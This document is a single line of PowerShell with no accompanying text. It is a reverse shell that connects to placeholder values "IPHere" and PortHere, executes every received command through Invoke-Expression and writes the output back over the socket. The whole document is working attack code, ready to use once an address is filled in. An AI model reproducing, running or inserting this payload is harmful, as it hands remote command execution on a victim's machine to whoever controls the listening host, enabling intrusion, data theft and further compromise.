$R=New-Object Net.Sockets.TCPClient("IPHere",PortHere);$S=$R.GetStream();[byte[]]$BT=0..65535|%{0};while(($i=$S.Read($BT,0,$BT.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($BT,0,$i);$St=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$S.Write($St,0,$St.Length)};